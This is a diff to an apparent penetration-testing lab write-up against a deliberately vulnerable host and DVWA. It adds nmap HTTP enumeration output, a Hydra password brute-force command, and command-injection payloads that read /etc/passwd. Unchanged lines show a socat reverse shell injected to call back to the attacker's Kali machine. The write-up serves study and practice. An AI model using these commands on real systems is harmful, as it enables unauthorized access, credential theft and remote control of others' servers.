@@ -63,7 +63,31 @@
   <ul>message signing disabled</ul>
 </ol></p>
 <h2>HTTP enumeration</h2>
-<p></p>
+<p><ol>
+ <ul>nmap -p 80 -T4 -v --script *http-enum* 192.168.1.69</ul>
+ <ul>80/tcp open http</ul>
+ <ul>http-enum:</ul>
+ <ul>/tikiwiki/: Tikiwiki</ul>
+ <ul>/test/: Test page</ul>
+ <ul>/phpinfo.php: Possible information file</ul>
+ <ul>/phpMyAdmin/: phpMyAdmin</ul>
+ <ul>/doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'</ul>
+ <ul>/icons/: Potentially interesting folder w/ directory listing</ul>
+ <ul>/index/: Potentially interesting folder</ul>
+</ol></p>
+<h1>Brute Force</h1>
+<p>Modern brute force attacks can now easily crack 8-characters alphanumeric password in just a mere 2 hours, while more advanced encryption hashes can be cracked in a few months. This can be achieved by 
+ performing exhaustive key search, in which the computer will try every possible combination of every single possible character in order to find the right combination of characters as the password. 
+ For the purpose of this demonstration, I will be setting up the Damn Vulnerable Web Application (DVWA) to simulate a brute force attack.</p>
+<p>Open a Burp Suite browser and direct it to the DVWA page, which will look exactly like the one on a regular browser. Now, try logging in using a random password. For this attempt, the username “admin” and 
+ password “admin123” was used. For Burp Suite to scan the web application, <b>turn on the Intercept mode right before clicking on the “Login” button</b>. Using Burp Suite we have gathered information that 
+may be useful (session cookies, parameters of the request etc.)</p>
+<p>The next step is to use Hydra to crack the account password:</p>
+<p><ol>
+ <ul>hydra 192.168.1.69 -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=XXXX;security=low:F=Username and/or 
+  password incorrect"</ul>
+ <ul>The result of the attack reveals the password to be "password", which will show that the login is succesful</ul>
+</ol></p>
 <h1>Command Execution</h1>
 <p>Command Execution refers to the unauthorized ability to run arbitrary commands on a target system. This type of attack occurs when an attacker is able to execute commands on a server or machine, 
  often with elevated privileges, allowing them to manipulate, steal, or delete data, install malware, or perform other malicious activities. Command Execution or Command injection is an attack in 
@@ -73,6 +97,7 @@
 <p><ol>
  <ul>8.8.8.8;ls -al</ul>
  <ul>8.8.8.8;cat /etc/passwd</ul>
+ <ul>|| cat /etc/passwd</ul>
 </ol></p>
 <h2>Reverse shell with Socat</h2>
 <p>Socat is useful for connecting applications inside separate boxes. Imagine we have Box A and Box B, and inside Box A, there’s a database server application running. 
@@ -85,6 +110,7 @@ some database queries to the database server application in Box A. Then, the dat
  <ul>8.8.8.8; socat tcp-connect:[IP address of Kali] exec:bash,pty,stderr,setsid,sigint</ul>
  <ul>at this point, our connection should be established in the terminal windows where we created the TCP listener and we are now in the server</ul>
 </ol></p>
+<h1>Brute Force</h1>
 
 
 
